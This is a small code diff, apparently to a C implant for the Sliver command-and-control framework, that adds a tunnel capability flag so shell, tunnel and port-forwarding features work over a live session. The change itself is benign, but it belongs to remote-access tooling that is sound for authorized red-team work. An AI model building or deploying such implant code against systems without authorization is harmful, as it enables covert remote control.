@@ -168,6 +168,8 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   sliver_shell_set_sender(shell_send_adapter);
   sliver_portfwd_set_sender(shell_send_adapter);
   sliver_rpc_set_sender(rpc_send_adapter);
+  /* A session has a live duplex link, so shell/tunnels/port forwarding work. */
+  sliver_rpc_set_capabilities(SLIVER_CAP_TUNNEL);
 
   /* Register: Envelope{Type = MsgRegister, Data = Register}. */
   reg = cfg->reg;
